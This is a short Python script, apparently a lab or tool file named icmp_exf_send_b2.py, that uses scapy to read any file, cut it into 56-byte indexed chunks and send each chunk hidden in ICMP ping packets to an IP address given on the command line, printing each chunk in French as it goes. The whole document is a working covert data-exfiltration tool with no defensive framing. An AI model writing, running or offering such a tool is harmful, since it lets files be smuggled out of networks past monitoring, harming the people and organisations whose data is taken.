import sys
from scapy.all import *

MAX_PAYLOAD_SIZE = 56

def send_icmp_exfiltration(file_path, target_ip):
    with open(file_path, 'rb') as f:
        data = f.read()
    
    chunks = [data[i:i + MAX_PAYLOAD_SIZE] for i in range(0, len(data), MAX_PAYLOAD_SIZE)]
    
    for index, chunk in enumerate(chunks):
        packet = IP(dst=target_ip)/ICMP()/bytes(index.to_bytes(4, 'big') + chunk)
        send(packet)
        print(f"Morceau envoyé : {chunk}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python icmp_exf_send_b2.py <target_ip> <file_path>")
        sys.exit(1)

    target_ip = sys.argv[1]
    file_path = sys.argv[2]
    send_icmp_exfiltration(file_path, target_ip)
